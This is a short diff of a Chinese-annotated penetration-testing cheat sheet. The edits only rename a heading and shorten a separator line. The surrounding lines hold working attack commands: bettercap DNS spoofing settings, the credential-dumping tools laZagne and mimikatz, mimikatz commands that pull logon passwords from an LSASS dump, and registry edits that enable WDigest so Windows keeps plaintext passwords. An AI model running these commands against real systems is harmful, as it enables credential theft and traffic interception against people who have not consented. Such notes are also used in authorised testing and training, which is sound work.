@@ -210,7 +210,7 @@ set dns.spoof.address desired_IP          //设置要重定向的地址
 set dns.spoof.all true                    //回应任何请求(默认只会回应那些对本地的请求)
 ```
 
-## window-informationCollection
+## Window-collect 
 
 - laZagne
 - mimikatz
@@ -219,7 +219,7 @@ set dns.spoof.all true                    //回应任何请求(默认只会回�
 privilege::debug
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords full
-------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------
 #修改注册表开启/关闭Wdigest Auth
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
